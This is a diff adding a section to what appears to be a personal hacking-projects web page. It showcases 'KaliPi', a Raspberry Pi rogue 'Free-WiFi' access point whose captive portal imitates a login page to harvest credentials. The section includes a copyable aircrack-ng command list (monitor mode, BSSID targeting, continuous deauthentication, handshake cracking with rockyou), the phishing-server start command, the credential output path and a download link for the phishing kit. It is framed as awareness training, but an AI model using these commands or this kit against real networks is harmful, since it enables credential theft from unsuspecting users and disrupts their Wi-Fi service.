@@ -259,6 +259,76 @@ There's nothing here yet :(
             <br>
             <br>
 
+
+                         <!-- Section for KaliPi Project -->
+            <p id="kalipi"><img src="images/coin.gif" alt="Skull"> <strong>KaliPi (Free-WiFi Honeypot)</strong> <img src="images/coin.gif" alt="Skull"></p>
+            <ul>
+                <li><em>A Raspberry Pi project made for ethical hacking, testing, and awareness training.</em></li>
+                <li><em>Spawns a fake open SSID: <strong>Free-WiFi</strong></em></li>
+                <li><em>Victims are redirected to a captive portal that mimics a login page to "gain internet access."</em></li>
+                <li><em>Credentials entered are stored locally on the Pi.</em></li>
+            </ul>
+
+            <br>
+            <p><img src="images/kalipi-terminal.png" alt="kalipi terminal" style="max-width: 40%; border: 2px solid lime;">
+                <img src="images/kalipi-portal.png" alt="kalipi captive portal" style="max-width: 20%; border: 2px solid lime;"></p>
+            
+
+            <div class="script-box">
+            <pre>
+⚙️ Setup tips from the Pi boot banner:
+-------------------------------------
+- sudo ip route add default via 192.168.137.1
+- Use `nmtui` for configuring WiFi
+- Start phishing capture server: 
+  node /home/kali/hackpi-site/html/server.js
+
+💻 Wireless Tools:
+------------------
+Put adapter in monitor mode:
+  airmon-ng start wlan1
+
+Stop monitor mode:
+  airmon-ng stop wlan1mon
+
+Scan SSIDs:
+  airodump-ng wlan1mon
+
+Target a specific BSSID:
+  airodump-ng -c 6 -w capture.pcap -d BSSID wlan1mon
+
+Deauth attack:
+  aireplay-ng --deauth 0 -a ACCESSPOINT_BSSID -c CLIENT_BSSID wlan1mon
+
+Crack captured handshake:
+  aircrack-ng capture.pcap-01.cap -w ~/Attacks/wordlists/rockyou.txt
+
+📁 Config & Phish Page Paths:
+-------------------------------
+Credentials captured: 
+  /home/kali/hackpi-site/html/output.txt
+
+Configs:
+  /etc/hostapd/hostapd.conf     - WAP config
+  /etc/dnsmasq.conf             - DNS/DHCP
+  /etc/dhcp/dhcpd.conf          - Also DHCP
+  /etc/nodogsplash/htdocs/splash.html - Captive splash page
+  /home/kali/hackpi-site/html   - Web files
+            </pre>
+            <button class="copy-btn" onclick="copyScript('script-kalipi')">Copy</button>
+            </div>
+            <p></p>
+            <br>
+            <li><a href="tools/KaliPi_phish_files.7z" download="KaliPi_phish_files.7z">KaliPi_phish_files.7z</a></li>
+            <br>
+            <br>
+            <br>
+            <br>
+            <br>
+            <br>
+            <br>
+  
+
             <!-- Section for Infodump -->
             <p id="infodump"><img src="images/coin.gif" alt="Skull"> <strong>infodump</strong> <img src="images/coin.gif" alt="Skull"></p>
             <ul>
